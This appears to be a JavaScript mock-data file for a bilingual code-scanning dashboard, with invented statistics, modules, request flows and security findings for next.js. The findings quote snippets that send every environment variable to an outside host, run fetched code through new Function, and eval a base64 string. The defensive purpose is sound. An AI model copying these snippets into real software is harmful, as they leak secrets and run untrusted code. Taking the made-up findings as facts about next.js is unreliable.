// Mock data + i18n strings.
// Holds repos, modules, security findings, chat seeds, and Vietnamese/English translations.
// Exposed as window.DATA and window.I18N.

const SCAN_DONE = {
  id: 'sess-vercel-next',
  status: 'ready',
  repo: {
    url: 'https://github.com/vercel/next.js',
    name: 'next.js',
    owner: 'vercel',
    branch: 'canary',
    commit: '7a4f2b8',
    stars: 124800,
    forks: 26900,
    license: 'MIT',
    desc: {
      vi: 'The React framework for production — render server-first, đa stack, deploy nhanh.',
      en: 'The React framework for production — server-first rendering, full stack, instant deploy.',
    },
  },
  stats: { loc: 1284530, files: 6932, modules: 47, contributors: 3128, lastCommit: '2 giờ trước' },
  langs: [
    { name: 'TypeScript', pct: 64, color: '#3178C6' },
    { name: 'JavaScript', pct: 18, color: '#F7DF1E' },
    { name: 'Rust',       pct: 12, color: '#DEA584' },
    { name: 'CSS',        pct: 4,  color: '#38BDF8' },
    { name: 'MDX',        pct: 2,  color: '#A78BFA' },
  ],
  frameworks: ['React 18', 'Turbopack', 'SWC', 'Webpack 5', 'Tailwind 3', 'Vitest', 'Playwright'],
};

const SCAN_LIVE = {
  id: 'sess-acme-orders',
  status: 'scanning',
  repo: {
    url: 'https://github.com/acme/orders-api',
    name: 'orders-api',
    owner: 'acme',
    branch: 'main',
    commit: 'b8d1c40',
    stars: 412,
    forks: 38,
    license: 'Apache-2.0',
    desc: {
      vi: 'Hệ thống đặt hàng nội bộ — Node, Postgres, Redis. Đang được quét.',
      en: 'Internal orders system — Node, Postgres, Redis. Currently scanning.',
    },
  },
  stats: { loc: 84210, files: 612, modules: 12, contributors: 24, lastCommit: '5 phút trước' },
  langs: [
    { name: 'TypeScript', pct: 78, color: '#3178C6' },
    { name: 'SQL',        pct: 12, color: '#F472B6' },
    { name: 'Shell',      pct: 6,  color: '#10B981' },
    { name: 'YAML',       pct: 4,  color: '#FB7185' },
  ],
  frameworks: ['Express 5', 'Prisma', 'BullMQ', 'Zod', 'Jest', 'Docker'],
};

// File tree for the scanned repo
const FILE_TREE = [
  { type: 'dir', name: 'apps', expanded: true, children: [
    { type: 'dir', name: 'web', children: [
      { type: 'file', name: 'page.tsx', lang: 'tsx', loc: 142, role: { vi: 'Trang gốc — server component', en: 'Root page — server component' } },
      { type: 'file', name: 'layout.tsx', lang: 'tsx', loc: 88, role: { vi: 'Layout & providers', en: 'Layout & providers' } },
      { type: 'dir', name: 'auth', children: [
        { type: 'file', name: 'login.tsx', lang: 'tsx', loc: 214, role: { vi: 'Form đăng nhập', en: 'Login form' } },
        { type: 'file', name: 'callback.ts', lang: 'ts', loc: 96, role: { vi: 'OAuth callback handler', en: 'OAuth callback handler' } },
      ] },
    ] },
    { type: 'dir', name: 'docs', children: [
      { type: 'file', name: 'index.mdx', lang: 'md', loc: 320, role: { vi: 'Trang docs chính', en: 'Main docs page' } },
    ] },
  ] },
  { type: 'dir', name: 'packages', expanded: true, children: [
    { type: 'dir', name: 'next', expanded: true, children: [
      { type: 'dir', name: 'src/server', children: [
        { type: 'file', name: 'next-server.ts', lang: 'ts', loc: 2840, role: { vi: 'Lõi server — handle request', en: 'Server core — request handling' } },
        { type: 'file', name: 'render.tsx', lang: 'tsx', loc: 1782, role: { vi: 'Pipeline render React', en: 'React rendering pipeline' } },
        { type: 'file', name: 'router.ts', lang: 'ts', loc: 904, role: { vi: 'Routing động', en: 'Dynamic routing' } },
      ] },
      { type: 'dir', name: 'src/client', children: [
        { type: 'file', name: 'index.ts', lang: 'ts', loc: 612, role: { vi: 'Hydration entry', en: 'Hydration entry' } },
        { type: 'file', name: 'app-router.tsx', lang: 'tsx', loc: 1340, role: { vi: 'App Router runtime', en: 'App Router runtime' } },
      ] },
      { type: 'dir', name: 'src/build', children: [
        { type: 'file', name: 'webpack-config.ts', lang: 'ts', loc: 3211 },
        { type: 'file', name: 'compiler.ts', lang: 'ts', loc: 1108 },
      ] },
    ] },
    { type: 'dir', name: 'create-next-app', children: [
      { type: 'file', name: 'index.ts', lang: 'ts', loc: 612 },
    ] },
  ] },
  { type: 'dir', name: 'crates', children: [
    { type: 'file', name: 'next-core/lib.rs', lang: 'rs', loc: 1820, role: { vi: 'Lõi Turbopack', en: 'Turbopack core' } },
    { type: 'file', name: 'next-swc/lib.rs', lang: 'rs', loc: 920 },
  ] },
  { type: 'dir', name: 'test', children: [
    { type: 'file', name: 'integration.spec.ts', lang: 'ts', loc: 412 },
  ] },
  { type: 'file', name: 'package.json', lang: 'json', loc: 88 },
  { type: 'file', name: 'turbo.json',   lang: 'json', loc: 42 },
  { type: 'file', name: 'README.md',    lang: 'md',   loc: 156 },
  { type: 'file', name: 'tsconfig.json',lang: 'json', loc: 24 },
  { type: 'file', name: '.eslintrc.json', lang: 'json', loc: 18 },
];

const MODULES = [
  { name: 'next-server',  purpose: { vi: 'Xử lý request, render React server-side', en: 'Request handling & SSR pipeline' }, lang: 'ts',  files: 48, fns: 312, risk: 'Low',    layer: 'backend',
    detail: { vi: 'Module trung tâm của Next.js — tiếp nhận HTTP request, phân tích route, chọn runtime (Edge/Node), điều phối render pipeline. Hỗ trợ ISR, streaming, và on-demand revalidation.', en: 'Central module of Next.js — receives HTTP requests, resolves routes, selects runtime (Edge/Node), and orchestrates the render pipeline. Supports ISR, streaming, and on-demand revalidation.' },
    deps: ['app-router', 'cache-fs', 'middleware'], topFns: ['handleRequest()', 'resolveRoute()', 'renderToStream()', 'revalidatePath()'], loc: 28400 },
  { name: 'app-router',   purpose: { vi: 'Routing động phía client',                  en: 'Client-side dynamic routing' },             lang: 'tsx', files: 22, fns: 184, risk: 'Low',    layer: 'frontend',
    detail: { vi: 'Client-side router dùng React Server Components. Quản lý navigation, prefetching, nested layouts, loading states, và error boundaries.', en: 'Client-side router using React Server Components. Manages navigation, prefetching, nested layouts, loading states, and error boundaries.' },
    deps: ['next-server'], topFns: ['useRouter()', 'navigate()', 'prefetchRoute()', 'resolveSegment()'], loc: 18200 },
  { name: 'turbopack',    purpose: { vi: 'Bundler tốc độ cao (Rust)',                  en: 'High-speed bundler (Rust)' },                lang: 'rs',  files: 96, fns: 644, risk: 'Medium', layer: 'infra',
    detail: { vi: 'Bundler viết bằng Rust, cache ở mức function-call (memoization). Hot update nhanh hơn Webpack ~700x. Dùng incremental computation graph.', en: 'Rust-based bundler with function-call-level caching (memoization). ~700x faster hot updates than Webpack. Uses an incremental computation graph.' },
    deps: ['create-next'], topFns: ['bundle()', 'resolve_module()', 'transform()', 'emit_chunk()'], loc: 42800 },
  { name: 'image-opt',    purpose: { vi: 'Tối ưu ảnh on-demand',                       en: 'On-demand image optimization' },             lang: 'ts',  files: 14, fns: 96,  risk: 'Low',    layer: 'backend',
    detail: { vi: 'Tự động resize, compress, và convert ảnh sang WebP/AVIF. Cache kết quả theo URL + params. Hỗ trợ blur placeholder.', en: 'Auto-resizes, compresses, and converts images to WebP/AVIF. Caches results by URL + params. Supports blur placeholders.' },
    deps: ['cache-fs'], topFns: ['optimizeImage()', 'getBlurPlaceholder()', 'serveFromCache()'], loc: 6800 },
  { name: 'middleware',   purpose: { vi: 'Edge middleware runtime',                    en: 'Edge middleware runtime' },                  lang: 'ts',  files:  8, fns: 42,  risk: 'Medium', layer: 'edge',
    detail: { vi: 'Chạy trước routing trên Edge runtime. Dùng cho auth, redirects, A/B testing, geolocation. Giới hạn API (không có fs, child_process).', en: 'Runs before routing on Edge runtime. Used for auth, redirects, A/B testing, geolocation. Limited API surface (no fs, child_process).' },
    deps: ['next-server'], topFns: ['middleware()', 'NextResponse.rewrite()', 'NextResponse.redirect()'], loc: 3200 },
  { name: 'cache-fs',     purpose: { vi: 'Caching tiered: memory + filesystem',        en: 'Tiered cache: memory + FS' },                lang: 'ts',  files: 12, fns: 88,  risk: 'High',   layer: 'backend',
    detail: { vi: 'Hệ thống cache 2 lớp: memory (LRU) → filesystem. Tag-based invalidation với xxhash64. Risk cao vì liên quan trực tiếp đến data consistency.', en: 'Two-tier cache: memory (LRU) → filesystem. Tag-based invalidation via xxhash64. High risk due to direct impact on data consistency.' },
    deps: ['next-server'], topFns: ['resolveCachedResponse()', 'writeToCache()', 'invalidateByTag()', 'purge()'], loc: 8400 },
  { name: 'create-next',  purpose: { vi: 'CLI khởi tạo project mới',                   en: 'Project bootstrap CLI' },                    lang: 'ts',  files:  6, fns: 28,  risk: 'Low',    layer: 'tooling',
    detail: { vi: 'CLI tool tạo project Next.js mới. Hỗ trợ templates (TypeScript, Tailwind, App Router), git init, và package manager detection.', en: 'CLI tool for creating new Next.js projects. Supports templates (TypeScript, Tailwind, App Router), git init, and package manager detection.' },
    deps: [], topFns: ['createApp()', 'downloadTemplate()', 'installDeps()'], loc: 2400 },
  { name: 'docs-site',    purpose: { vi: 'Trang tài liệu (MDX)',                        en: 'Documentation site (MDX)' },                 lang: 'tsx', files: 38, fns: 142, risk: 'Low',    layer: 'frontend',
    detail: { vi: 'Website tài liệu chính thức dùng MDX. Hỗ trợ full-text search, version switching, và interactive code examples.', en: 'Official documentation website using MDX. Supports full-text search, version switching, and interactive code examples.' },
    deps: ['app-router'], topFns: ['renderMDX()', 'buildSearchIndex()', 'resolveDocRoute()'], loc: 14200 },
];

const SECURITY_FINDINGS = [
  {
    id: 'F-001', severity: 'high', confirmed: true, falsePositive: false,
    impact: 95, category: 'RCE',
    title: { vi: 'Eval động từ chuỗi remote', en: 'Dynamic eval from remote string' },
    file: 'packages/next/src/server/render.tsx', line: '482-489',
    rule: 'AST.dynamic-eval',
    why: { vi: 'Chuỗi từ HTTP response được truyền vào Function constructor — nguy cơ RCE.', en: 'Strings from an HTTP response are passed to the Function constructor — RCE risk.' },
    detail: { vi: 'Kẻ tấn công có thể kiểm soát nội dung của remoteUrl, inject arbitrary code chạy trên server. Ảnh hưởng: toàn bộ server process, có thể truy cập filesystem, env vars, và internal network.', en: 'An attacker can control the content at remoteUrl, injecting arbitrary code that runs on the server. Impact: full server process access including filesystem, env vars, and internal network.' },
    code: `// remote template loader\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = new Function('ctx', tpl);  // ⚠ runs untrusted code\nreturn fn(context);`,
    suggested: `import { sandboxedTemplate } from './tpl-sandbox';\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = sandboxedTemplate(tpl, { allow: ['ctx'] });\nreturn fn(context);`,
    refs: ['CWE-95', 'OWASP A03:2021'],
  },
  {
    id: 'F-002', severity: 'high', confirmed: true, falsePositive: false,
    impact: 88, category: 'Data Leak',
    title: { vi: 'Exfiltration: gửi env biến ra host bên ngoài', en: 'Exfiltration: env vars sent to external host' },
    file: 'packages/next/src/build/telemetry.ts', line: '128-134',
    rule: 'NET.suspicious-egress',
    why: { vi: 'Toàn bộ process.env được POST tới host không thuộc allowlist.', en: 'The whole process.env is POSTed to a host outside the allowlist.' },
    detail: { vi: 'Tất cả biến môi trường (DB passwords, API keys, secrets) bị gửi tới t.acme-track.io — domain không thuộc Vercel. Đây có thể là backdoor hoặc misconfigured telemetry.', en: 'All environment variables (DB passwords, API keys, secrets) are sent to t.acme-track.io — a domain not owned by Vercel. This could be a backdoor or misconfigured telemetry.' },
    code: `const payload = { env: { ...process.env }, ts: Date.now() };\nawait fetch('https://t.acme-track.io/log', {\n  method: 'POST', body: JSON.stringify(payload),\n});`,
    suggested: `const payload = { ts: Date.now() }; // env removed\nif (config.telemetry.allowedHosts.includes(host)) {\n  await fetch(host, { method: 'POST', body: JSON.stringify(payload) });\n}`,
    refs: ['CWE-200'],
  },
  {
    id: 'F-003', severity: 'medium', confirmed: true, falsePositive: false,
    impact: 65, category: 'Obfuscation',
    title: { vi: 'Obfuscation: chuỗi base64 + atob → eval', en: 'Obfuscation: base64 string + atob → eval' },
    file: 'packages/next/src/lib/_internal.ts', line: '12',
    rule: 'AST.obfuscation',
    why: { vi: 'Phân tích tĩnh: chuỗi base64 dài giải mã thành JS thực thi.', en: 'Static analysis: long base64 string decodes into executable JS.' },
    detail: { vi: 'Base64 decode ra "console.log(\"tracked\")" — có vẻ vô hại nhưng pattern này thường dùng để ẩn payload phức tạp hơn. Nên thay bằng code tường minh.', en: 'Base64 decodes to "console.log(\"tracked\")" — appears harmless but this pattern is commonly used to hide more complex payloads. Replace with explicit code.' },
    code: `const _0x = 'Y29uc29sZS5sb2coInRyYWNrZWQiKQ==';\neval(atob(_0x));  // hidden code`,
    suggested: `// Remove obfuscation; declare intent explicitly:\nimport { trackEvent } from '../telemetry';\ntrackEvent('boot');`,
    refs: ['MITRE T1027'],
  },
  {
    id: 'F-004', severity: 'medium', confirmed: false, falsePositive: false,
    impact: 55, category: 'Supply Chain',
    title: { vi: 'Dependency có lịch sử supply-chain', en: 'Dependency with supply-chain history' },
    file: 'package.json', line: '47',
    rule: 'PKG.compromised-history',
    why: { vi: '"event-stream@3.3.6" — phiên bản từng bị inject 2018. Heuristic, cần xác minh.', en: '"event-stream@3.3.6" — version compromised in 2018. Heuristic, needs review.' },
    detail: { vi: 'Package event-stream@3.3.6 chứa flatmap-stream — thư viện bị inject mã đánh cắp Bitcoin wallet. Phiên bản 4.0+ đã clean. Upgrade ngay.', en: 'Package event-stream@3.3.6 contains flatmap-stream — a library injected with Bitcoin wallet-stealing code. Version 4.0+ is clean. Upgrade immediately.' },
    code: `"dependencies": {\n  "event-stream": "3.3.6",\n  ...\n}`,
    suggested: `"dependencies": {\n  "event-stream": "4.0.1",\n  ...\n}`,
    refs: ['npm advisory 737'],
  },
  {
    id: 'F-005', severity: 'low', confirmed: false, falsePositive: true,
    impact: 10, category: 'Secret',
    title: { vi: 'Chuỗi giống API key trong test fixture', en: 'API-key-like string in test fixture' },
    file: 'test/fixtures/auth.json', line: '8',
    rule: 'SECRET.entropy',
    why: { vi: 'Entropy cao nhưng chỉ là dummy fixture, đã được xác nhận là false positive.', en: 'High entropy but it\'s only a dummy test fixture — confirmed false positive.' },
    detail: { vi: 'Chuỗi "sk_test_FAKE_..." rõ ràng là test data, không phải key thật. Pattern "FAKE" trong key xác nhận đây là fixture.', en: 'String "sk_test_FAKE_..." is clearly test data, not a real key. The "FAKE" pattern in the key confirms this is a fixture.' },
    code: `"apiKey": "sk_test_FAKE_4eC39HqLyjWDarjtT1zdp7dc"`,
    suggested: `// no change needed — false positive`,
    refs: [],
  },
  {
    id: 'F-006', severity: 'low', confirmed: false, falsePositive: true,
    impact: 5, category: 'Eval',
    title: { vi: 'eval trong file test', en: 'eval inside test file' },
    file: 'test/integration.spec.ts', line: '231',
    rule: 'AST.dynamic-eval',
    why: { vi: 'Tham chiếu eval nhưng nằm trong assertion về parser — false positive.', en: 'Reference to eval inside a parser assertion — false positive.' },
    detail: { vi: 'eval(\'1+1\') dùng trong expect() — đây là test case kiểm tra parser không throw. Hoàn toàn an toàn.', en: 'eval(\'1+1\') used inside expect() — this is a test case verifying the parser doesn\'t throw. Completely safe.' },
    code: `expect(() => eval('1+1')).not.toThrow();`,
    suggested: `// no change — used intentionally for parser test`,
    refs: [],
  },
];

// Architecture nodes — used by our SVG diagram
const ARCH_NODES = [
  { id: 'cli',     label: 'create-next-app', sub: 'CLI', layer: 'tooling',  x: 60,   y: 40,
    detail: { vi: 'CLI tool khởi tạo project. Tải template, cài dependencies, và cấu hình TypeScript/Tailwind/ESLint.', en: 'Project scaffolding CLI. Downloads templates, installs deps, and configures TypeScript/Tailwind/ESLint.' },
    files: 6, loc: 2400 },
  { id: 'app',     label: 'App Router',      sub: 'React 18',     layer: 'frontend', x: 280,  y: 40,
    detail: { vi: 'Client-side router: nested layouts, RSC streaming, prefetch, error boundaries. Core runtime cho mọi Next.js app.', en: 'Client-side router: nested layouts, RSC streaming, prefetch, error boundaries. Core runtime for every Next.js app.' },
    files: 22, loc: 18200 },
  { id: 'mw',      label: 'Middleware',      sub: 'Edge runtime', layer: 'edge',     x: 540,  y: 40,
    detail: { vi: 'Chạy trước mọi request trên Edge. Auth, redirect, A/B test, geo-routing. API giới hạn (no Node APIs).', en: 'Runs before every request on Edge. Auth, redirect, A/B tests, geo-routing. Limited API surface (no Node APIs).' },
    files: 8, loc: 3200 },
  { id: 'server',  label: 'next-server',     sub: 'SSR + RSC',    layer: 'backend',  x: 280,  y: 180,
    detail: { vi: 'Module trung tâm: resolve route → chọn runtime → render → stream response. Hỗ trợ ISR + on-demand revalidation.', en: 'Central module: resolves route → selects runtime → renders → streams response. Supports ISR + on-demand revalidation.' },
    files: 48, loc: 28400 },
  { id: 'render',  label: 'Render pipeline', sub: 'React Server', layer: 'backend',  x: 540,  y: 180,
    detail: { vi: 'Pipeline render React: Server Components → Client Components → HTML stream. Xử lý Suspense boundaries.', en: 'React render pipeline: Server Components → Client Components → HTML stream. Handles Suspense boundaries.' },
    files: 18, loc: 12600 },
  { id: 'tp',      label: 'Turbopack',       sub: 'Rust bundler', layer: 'infra',    x: 60,   y: 180,
    detail: { vi: 'Bundler Rust, memoization ở function-call level. Hot update O(changed) thay vì O(graph). ~700x nhanh hơn Webpack.', en: 'Rust bundler with function-call level memoization. Hot updates scale O(changed) not O(graph). ~700x faster than Webpack.' },
    files: 96, loc: 42800 },
  { id: 'cache',   label: 'cache-fs',        sub: 'Tiered cache', layer: 'backend',  x: 60,   y: 320,
    detail: { vi: 'Cache 2 lớp: memory LRU → filesystem. Tag-based invalidation (xxhash64). Quyết định cache hit/miss cho ISR.', en: 'Two-tier cache: memory LRU → filesystem. Tag-based invalidation (xxhash64). Determines cache hit/miss for ISR.' },
    files: 12, loc: 8400 },
  { id: 'img',     label: 'image-opt',       sub: 'On-demand',    layer: 'backend',  x: 280,  y: 320,
    detail: { vi: 'Optimize ảnh on-the-fly: resize, WebP/AVIF convert, blur placeholder. Cache kết quả theo URL+params.', en: 'On-the-fly image optimization: resize, WebP/AVIF conversion, blur placeholders. Caches by URL+params.' },
    files: 14, loc: 6800 },
  { id: 'db',      label: 'Adapters',        sub: 'KV / Edge DB', layer: 'data',     x: 540,  y: 320,
    detail: { vi: 'Adapter layer cho data stores: Vercel KV, Edge Config, external databases. Abstract away provider-specific APIs.', en: 'Adapter layer for data stores: Vercel KV, Edge Config, external databases. Abstracts away provider-specific APIs.' },
    files: 10, loc: 4200 },
];
const ARCH_EDGES = [
  ['cli', 'app',     { label: 'scaffolds' }],
  ['app', 'mw',      { label: 'pre-route' }],
  ['app', 'server',  { label: 'SSR request' }],
  ['mw', 'render',   { label: 'forward' }],
  ['server', 'render', { label: 'render()' }],
  ['server', 'cache',  { label: 'lookup/write' }],
  ['render', 'img',    { label: 'optimize' }],
  ['render', 'db',     { label: 'fetch data' }],
  ['tp', 'app',        { label: 'bundle' }],
  ['tp', 'server',     { label: 'compile' }],
  ['cache', 'db',      { label: 'fallback' }],
];

const FLOWS = {
  'login': {
    name: { vi: 'Đăng nhập OAuth', en: 'OAuth login flow' },
    actors: ['User', 'Browser', 'next-server', 'AuthProvider', 'DB'],
    actorInfo: {
      'User':         { vi: 'Người dùng cuối', en: 'End user', tech: 'Human' },
      'Browser':      { vi: 'Trình duyệt web', en: 'Web browser', tech: 'Chrome / Firefox' },
      'next-server':  { vi: 'Next.js server runtime', en: 'Next.js server runtime', tech: 'Node.js SSR' },
      'AuthProvider': { vi: 'Nhà cung cấp OAuth', en: 'OAuth provider', tech: 'Google / GitHub' },
      'DB':           { vi: 'Cơ sở dữ liệu', en: 'Database', tech: 'PostgreSQL' },
    },
    steps: [
      { from: 'User', to: 'Browser', label: 'Click "Sign in"',
        detail: { vi: 'Người dùng click nút đăng nhập trên giao diện. Trigger client-side navigation.', en: 'User clicks the sign-in button on the UI. Triggers client-side navigation.' }, dataFlow: 'UI event' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/login',
        detail: { vi: 'Browser gửi request tới route /auth/login. Server xử lý và redirect tới OAuth provider.', en: 'Browser sends request to /auth/login route. Server handles and redirects to OAuth provider.' }, dataFlow: 'HTTP GET' },
      { from: 'next-server', to: 'AuthProvider', label: 'redirect → OAuth consent',
        detail: { vi: 'Server tạo authorization URL với client_id, redirect_uri, scope. Redirect 302 tới provider.', en: 'Server constructs authorization URL with client_id, redirect_uri, scope. Issues 302 redirect to provider.' }, dataFlow: '302 Redirect' },
      { from: 'AuthProvider', to: 'Browser', label: 'callback?code=…',
        detail: { vi: 'Sau khi user authorize, provider redirect về callback URL kèm authorization code.', en: 'After user authorizes, provider redirects back to callback URL with authorization code.' }, dataFlow: 'Auth code' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/callback',
        detail: { vi: 'Browser tự động follow redirect, gửi auth code tới server callback handler.', en: 'Browser automatically follows redirect, sends auth code to server callback handler.' }, dataFlow: 'code=abc123' },
      { from: 'next-server', to: 'AuthProvider', label: 'exchange code → token',
        detail: { vi: 'Server exchange authorization code lấy access_token + refresh_token. POST request server-to-server.', en: 'Server exchanges authorization code for access_token + refresh_token. Server-to-server POST request.' }, dataFlow: 'access_token' },
      { from: 'next-server', to: 'DB', label: 'upsert user',
        detail: { vi: 'Tạo hoặc cập nhật user record trong database. Lưu profile, email, provider info.', en: 'Create or update user record in database. Stores profile, email, provider info.' }, dataFlow: 'SQL INSERT/UPDATE' },
      { from: 'next-server', to: 'Browser', label: 'set-cookie session',
        detail: { vi: 'Server tạo session JWT, set HTTP-only cookie, redirect về trang chính.', en: 'Server creates session JWT, sets HTTP-only cookie, redirects to home page.' }, dataFlow: 'Set-Cookie' },
    ],
  },
  'render': {
    name: { vi: 'Render trang động', en: 'Dynamic page render' },
    actors: ['Browser', 'Edge', 'next-server', 'cache-fs', 'DB'],
    actorInfo: {
      'Browser':     { vi: 'Client browser', en: 'Client browser', tech: 'React hydration' },
      'Edge':        { vi: 'Edge CDN layer', en: 'Edge CDN layer', tech: 'Cloudflare / Vercel Edge' },
      'next-server': { vi: 'Origin server', en: 'Origin server', tech: 'Node.js' },
      'cache-fs':    { vi: 'Cache layer', en: 'Cache layer', tech: 'Memory + FS' },
      'DB':          { vi: 'Data store', en: 'Data store', tech: 'PostgreSQL' },
    },
    steps: [
      { from: 'Browser', to: 'Edge', label: 'GET /products/123',
        detail: { vi: 'Browser request trang product. Edge CDN kiểm tra static cache trước.', en: 'Browser requests product page. Edge CDN checks static cache first.' }, dataFlow: 'HTTP GET' },
      { from: 'Edge',    to: 'next-server', label: 'forward + region',
        detail: { vi: 'Cache miss ở Edge → forward request tới origin server gần nhất. Attach region header.', en: 'Cache miss at Edge → forwards request to nearest origin server. Attaches region header.' }, dataFlow: 'x-vercel-region' },
      { from: 'next-server', to: 'cache-fs', label: 'lookup ISR',
        detail: { vi: 'Server kiểm tra ISR cache: memory LRU trước, rồi filesystem. So sánh revalidation time.', en: 'Server checks ISR cache: memory LRU first, then filesystem. Compares revalidation time.' }, dataFlow: 'cache key' },
      { from: 'cache-fs', to: 'next-server', label: 'miss',
        detail: { vi: 'Cache miss hoặc stale → cần render lại. Server bắt đầu full render pipeline.', en: 'Cache miss or stale → needs re-render. Server initiates full render pipeline.' }, dataFlow: 'null / stale' },
      { from: 'next-server', to: 'DB', label: 'fetch product',
        detail: { vi: 'Query database lấy product data. Dùng prepared statement, connection pooling.', en: 'Queries database for product data. Uses prepared statements, connection pooling.' }, dataFlow: 'SELECT * FROM products' },
      { from: 'next-server', to: 'cache-fs', label: 'write tag:product:123',
        detail: { vi: 'Ghi rendered HTML vào cache với tag "product:123". Cho phép on-demand invalidation theo tag.', en: 'Writes rendered HTML to cache tagged "product:123". Enables on-demand invalidation by tag.' }, dataFlow: 'HTML + tags' },
      { from: 'next-server', to: 'Browser', label: 'streaming HTML',
        detail: { vi: 'Stream HTML response qua React Suspense boundaries. Shell → content → hydration scripts.', en: 'Streams HTML response via React Suspense boundaries. Shell → content → hydration scripts.' }, dataFlow: 'Transfer-Encoding: chunked' },
    ],
  },
  'build': {
    name: { vi: 'Build & deploy', en: 'Build & deploy' },
    actors: ['Dev', 'CLI', 'Turbopack', 'Compiler', 'Output'],
    actorInfo: {
      'Dev':       { vi: 'Developer', en: 'Developer', tech: 'Terminal' },
      'CLI':       { vi: 'Next.js CLI', en: 'Next.js CLI', tech: 'Node.js' },
      'Turbopack': { vi: 'Rust bundler', en: 'Rust bundler', tech: 'Rust / Tokio' },
      'Compiler':  { vi: 'SWC compiler', en: 'SWC compiler', tech: 'Rust / WASM' },
      'Output':    { vi: 'Build output', en: 'Build output', tech: '.next/ directory' },
    },
    steps: [
      { from: 'Dev', to: 'CLI', label: 'next build',
        detail: { vi: 'Developer chạy lệnh build. CLI parse config, khởi tạo build context.', en: 'Developer runs build command. CLI parses config, initializes build context.' }, dataFlow: 'CLI args' },
      { from: 'CLI', to: 'Turbopack', label: 'spawn workers',
        detail: { vi: 'CLI khởi tạo Turbopack worker pool. Số workers = CPU cores. Chia task theo module graph.', en: 'CLI initializes Turbopack worker pool. Workers = CPU cores. Tasks split by module graph.' }, dataFlow: 'Worker threads' },
      { from: 'Turbopack', to: 'Compiler', label: 'parse + type-check',
        detail: { vi: 'SWC parse TypeScript → AST. Type-check parallel. Transform JSX → JS.', en: 'SWC parses TypeScript → AST. Parallel type-checking. Transforms JSX → JS.' }, dataFlow: 'AST' },
      { from: 'Compiler', to: 'Turbopack', label: 'IR',
        detail: { vi: 'Compiler trả về Intermediate Representation. Turbopack dùng IR để tối ưu bundle.', en: 'Compiler returns Intermediate Representation. Turbopack uses IR for bundle optimization.' }, dataFlow: 'IR chunks' },
      { from: 'Turbopack', to: 'Output', label: 'emit .next/',
        detail: { vi: 'Emit final bundles, manifests, static assets vào .next/ directory.', en: 'Emits final bundles, manifests, static assets into .next/ directory.' }, dataFlow: 'JS + CSS + manifests' },
      { from: 'Output', to: 'Dev', label: 'manifest + report',
        detail: { vi: 'Hiện build report: page sizes, bundle analysis, warnings. Manifest cho runtime.', en: 'Shows build report: page sizes, bundle analysis, warnings. Manifest for runtime.' }, dataFlow: 'Build stats' },
    ],
  },
};

// Framework descriptions for interactive chips
const FRAMEWORK_DETAILS = {
  'React 18':    { vi: 'UI library chính — hỗ trợ Server Components, Suspense, concurrent rendering.', en: 'Core UI library — supports Server Components, Suspense, concurrent rendering.' },
  'Turbopack':   { vi: 'Bundler viết bằng Rust, thay thế Webpack. ~700x nhanh hơn hot update.', en: 'Rust-based bundler replacing Webpack. ~700x faster hot updates.' },
  'SWC':         { vi: 'Rust compiler cho JavaScript/TypeScript. Nhanh hơn Babel 17x.', en: 'Rust compiler for JavaScript/TypeScript. 17x faster than Babel.' },
  'Webpack 5':   { vi: 'Bundler fallback khi Turbopack chưa hỗ trợ tính năng. Module federation.', en: 'Fallback bundler when Turbopack lacks feature support. Module federation.' },
  'Tailwind 3':  { vi: 'Utility-first CSS framework. JIT compiler, tree-shaking tự động.', en: 'Utility-first CSS framework. JIT compiler, automatic tree-shaking.' },
  'Vitest':      { vi: 'Test runner tương thích Vite. Nhanh, HMR cho tests, native ESM.', en: 'Vite-compatible test runner. Fast, HMR for tests, native ESM.' },
  'Playwright':  { vi: 'E2E testing framework. Multi-browser, auto-wait, network interception.', en: 'E2E testing framework. Multi-browser, auto-wait, network interception.' },
  'Express 5':   { vi: 'Web framework cho Node.js. Xử lý routing, middleware pipeline.', en: 'Node.js web framework. Handles routing and middleware pipeline.' },
  'Prisma':      { vi: 'TypeScript ORM. Type-safe queries, migrations, schema management.', en: 'TypeScript ORM. Type-safe queries, migrations, schema management.' },
  'BullMQ':      { vi: 'Job queue dựa trên Redis. Scheduled jobs, retries, priorities.', en: 'Redis-based job queue. Scheduled jobs, retries, priorities.' },
  'Zod':         { vi: 'Runtime schema validation. TypeScript-first, composable schemas.', en: 'Runtime schema validation. TypeScript-first, composable schemas.' },
  'Jest':        { vi: 'Test runner phổ biến. Snapshot testing, mocking, coverage built-in.', en: 'Popular test runner. Snapshot testing, mocking, built-in coverage.' },
  'Docker':      { vi: 'Container platform. Đóng gói ứng dụng + dependencies vào image.', en: 'Container platform. Packages app + dependencies into images.' },
};

const README_MD = `# next.js

> The React framework for production.

Next.js gives you the building blocks to create fast, full-stack web applications with React. It handles routing, rendering, data fetching, caching, and deployment so you can focus on the product.

## Why Next.js
- **Server components** — data on the server, zero JS shipped for static parts.
- **App Router** — file-based routing with nested layouts and streaming.
- **Turbopack** — Rust-based incremental bundler, ~700× faster than Webpack on hot updates.
- **Edge & Node runtimes** — pick per route.

## Quick start
\`\`\`bash
npx create-next-app@latest my-app
cd my-app
npm run dev
\`\`\`

## Project layout
- \`apps/web/\` — example application
- \`packages/next/\` — framework source
- \`crates/\` — Rust crates (Turbopack, SWC plugins)
- \`docs/\` — MDX documentation site

## License
MIT © Vercel.
`;

const GENERATED_DOC = `# Architectural overview — vercel/next.js

_Tài liệu này được sinh tự động từ AST + RAG. Chỉnh sửa rồi mở Pull Request để cập nhật README._

## 1. Tổng quan

next.js là một meta-framework full-stack gồm:
1. **Frontend runtime** — App Router, React Server Components, hydration.
2. **Backend runtime** — \`next-server\` xử lý request, ISR, on-demand revalidation.
3. **Build system** — Turbopack (Rust) + SWC plugin pipeline.
4. **Edge layer** — middleware chạy trước routing.

## 2. Luồng request chính

\`Edge → next-server → cache-fs → DB → render → Browser\`

Cache hit trả ngay; cache miss đi qua **render pipeline** → ghi vào tagged cache.

## 3. Bảo mật

- Phát hiện 6 finding (2 high, 1 medium đã xác nhận; 2 low là false-positive).
- Khuyến nghị: gỡ \`event-stream\` và bọc \`new Function\` bằng sandbox.

## 4. So sánh với dự án của bạn (\`acme/orders-api\`)

- Cả hai dùng \`zod\` cho schema; có thể chia sẻ \`packages/validation\`.
- \`next-server\` có pattern caching tiered phù hợp để áp dụng cho \`/orders/list\` của bạn.
`;

// ----------------- Chat seed for the in-progress session -----------------
// Variety: locate, explain, suggest, audit, compare. Some during scan (provisional), some after.
